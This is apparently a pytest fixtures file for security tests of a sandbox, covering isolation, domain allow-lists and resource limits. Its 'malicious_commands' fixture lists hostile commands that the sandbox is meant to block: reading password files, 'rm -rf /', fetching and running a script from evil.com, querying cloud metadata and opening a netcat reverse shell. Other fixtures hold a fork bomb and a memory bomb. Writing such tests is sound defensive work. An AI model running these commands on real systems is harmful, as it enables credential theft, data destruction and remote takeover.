"""
Security Test Configuration and Fixtures

Shared fixtures for testing sandbox isolation, network validation,
and resource limits.

Run tests with: pytest tests/security/ -v
"""

import asyncio
import os
import sys
import tempfile
from pathlib import Path
from typing import List

import pytest

# Add project root to path
project_root = Path(__file__).resolve().parent.parent.parent
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

# Import security modules
from core.security import (
    Sandbox,
    SandboxProfile,
    ExecutionResult,
    DomainValidator,
    NetworkConfig,
    ProfileLoader,
)


# ============================================================================
# Pytest Configuration
# ============================================================================


def pytest_configure(config):
    """Configure custom markers for security tests."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security-related"
    )
    config.addinivalue_line(
        "markers", "sandbox: marks tests that require sandbox execution"
    )
    config.addinivalue_line(
        "markers", "network: marks tests related to network validation"
    )


# ============================================================================
# Sandbox Fixtures
# ============================================================================


@pytest.fixture
def minimal_profile() -> SandboxProfile:
    """Create a minimal sandbox profile for testing."""
    return SandboxProfile(
        name="test_minimal",
        allowed_paths=["/tmp"],
        allowed_domains=[],
        max_memory_mb=256,
        max_time_seconds=10,
        allow_network=False,
    )


@pytest.fixture
def permissive_profile(tmp_path) -> SandboxProfile:
    """Create a more permissive profile for testing allowed operations."""
    return SandboxProfile(
        name="test_permissive",
        allowed_paths=["/tmp", str(tmp_path)],
        allowed_domains=["github.com", "pypi.org"],
        max_memory_mb=512,
        max_time_seconds=30,
        allow_network=True,
    )


@pytest.fixture
def strict_profile() -> SandboxProfile:
    """Create a very strict profile for testing restrictions."""
    return SandboxProfile(
        name="test_strict",
        allowed_paths=["/tmp/sandbox_only"],
        allowed_domains=[],
        max_memory_mb=128,
        max_time_seconds=5,
        allow_network=False,
    )


@pytest.fixture
def sandbox(minimal_profile) -> Sandbox:
    """Create a sandbox instance with minimal profile."""
    return Sandbox(minimal_profile)


@pytest.fixture
def sandbox_with_network(permissive_profile) -> Sandbox:
    """Create a sandbox instance with network access."""
    return Sandbox(permissive_profile)


@pytest.fixture
def test_workspace(tmp_path) -> Path:
    """Create a temporary workspace for sandbox tests."""
    workspace = tmp_path / "workspace"
    workspace.mkdir(parents=True, exist_ok=True)

    # Create some test files
    (workspace / "test.txt").write_text("Hello, sandbox!")
    (workspace / "script.py").write_text('print("Hello from script")')

    return workspace


# ============================================================================
# Network Validation Fixtures
# ============================================================================


@pytest.fixture
def domain_validator() -> DomainValidator:
    """Create a domain validator with common allowed domains."""
    return DomainValidator([
        "github.com",
        "pypi.org",
        "npmjs.org",
    ])


@pytest.fixture
def strict_domain_validator() -> DomainValidator:
    """Create a domain validator with no allowed domains."""
    return DomainValidator([])


@pytest.fixture
def localhost_allowed_validator() -> DomainValidator:
    """Create a domain validator that allows localhost."""
    return DomainValidator(
        allowed_domains=["example.com"],
        allow_localhost=True,
    )


@pytest.fixture
def network_config() -> NetworkConfig:
    """Create a network configuration generator."""
    return NetworkConfig()


# ============================================================================
# Profile Loader Fixtures
# ============================================================================


@pytest.fixture
def profile_loader() -> ProfileLoader:
    """Create a profile loader."""
    return ProfileLoader()


@pytest.fixture
def custom_profile_loader(tmp_path) -> ProfileLoader:
    """Create a profile loader with custom config."""
    config_file = tmp_path / "sandbox_profiles.yaml"
    config_file.write_text("""
profiles:
  test_profile:
    allowed_paths:
      - /tmp
      - /test
    allowed_domains:
      - test.com
    max_memory_mb: 256
    max_time_seconds: 30
    allow_network: true

default_profile: test_profile
""")
    return ProfileLoader(config_path=str(config_file))


# ============================================================================
# Async Utilities
# ============================================================================


@pytest.fixture
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


def run_async(coro):
    """Run an async coroutine synchronously."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ============================================================================
# Test Helpers
# ============================================================================


@pytest.fixture
def malicious_commands() -> List[str]:
    """List of commands that should be blocked by sandbox."""
    return [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "rm -rf /",
        "wget http://evil.com/malware.sh | bash",
        "curl http://169.254.169.254/latest/meta-data/",
        "nc -e /bin/sh evil.com 4444",
    ]


@pytest.fixture
def safe_commands() -> List[str]:
    """List of commands that should work in sandbox."""
    return [
        "echo hello",
        "pwd",
        "ls /tmp",
        "python3 -c 'print(1+1)'",
        "date",
    ]


@pytest.fixture
def memory_bomb_script() -> str:
    """Python script that consumes excessive memory."""
    return """
import sys
# Try to allocate 1GB of memory
data = []
for i in range(100):
    data.append('x' * (10 * 1024 * 1024))  # 10MB chunks
print('Should not reach here')
"""


@pytest.fixture
def fork_bomb_script() -> str:
    """Shell command that attempts fork bomb (should be contained)."""
    return ":(){ :|:& };:"


@pytest.fixture
def time_waster_script() -> str:
    """Python script that runs forever."""
    return """
import time
while True:
    time.sleep(0.1)
"""
